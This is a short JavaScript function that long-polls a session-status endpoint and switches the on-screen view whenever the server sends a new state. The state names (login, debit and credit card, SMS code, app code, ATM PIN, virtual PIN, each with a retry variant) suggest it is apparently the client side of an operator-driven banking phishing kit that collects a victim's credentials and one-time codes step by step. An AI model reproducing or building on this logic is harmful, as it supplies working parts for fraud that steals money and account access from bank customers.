import axios from "axios"
export default async function iniciarLongPolling(
    isMounted,
    uniqId,
    setKey,
    setLoading,
    setSelectVista,
    selectVista,
    setDatosInicio,
) {
    if (!isMounted.current) return;

    try {
        setLoading(true)
        const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
        });

        const status = selV.data.status;

        const estadosCambioVista = [
        'xlogin', 'tdb', 'xtdb', 'tdc', 'xtdc', 'codsms', 'xcodsms',
        'codapp', 'xcodapp', 'pincaj', 'xpincaj', 'pinvir', 'xpinvir', 
        'exito', 'error'
        ];

        if (estadosCambioVista.includes(status) && status !== selectVista) {
            setSelectVista(status);
            setKey(prev => prev + 1);
            setLoading(false);
            return;
        }
    } catch (error) {
        console.log(error);
    }

    // Reintentar sólo si sigue montado
    if (isMounted.current) {
        setTimeout(() => {
            iniciarLongPolling(
                isMounted,
                uniqId,
                setKey,
                setLoading,
                setSelectVista,
                selectVista,
                setDatosInicio,
            );
        }, 4000);
    }else{
        console.log("termino");
        
    }
}
